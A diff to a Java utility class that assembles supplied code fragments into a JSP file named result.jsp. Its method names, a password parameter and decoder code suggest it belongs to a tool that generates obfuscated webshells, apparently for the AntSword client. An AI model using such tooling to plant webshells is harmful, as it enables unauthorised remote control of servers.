@@ -4,6 +4,20 @@ import com.github.javaparser.ast.body.MethodDeclaration;
 
 @SuppressWarnings("all")
 public class WriteUtil {
+    public static void writeAnt(String antClassCode, String antCode, String antDecCode, String decCode) {
+        try {
+            String prefix = "<%@ page language=\"java\" pageEncoding=\"UTF-8\"%>";
+            StringBuilder sb = new StringBuilder();
+            sb.append("<%!").append(antClassCode).append("%>")
+                    .append("<%!").append(antDecCode).append("%>")
+                    .append("<%!").append(decCode).append("%>")
+                    .append("<%").append(antCode).append("%>");
+            FileUtil.writeFile("result.jsp", compactCode(sb.toString()));
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+    }
+
     public static void writeSuper(MethodDeclaration method,MethodDeclaration decMethod,
                                   String password,boolean useUnicode){
         String prefix = "<%@ page import=\"java.net.URL\" %>\n" +
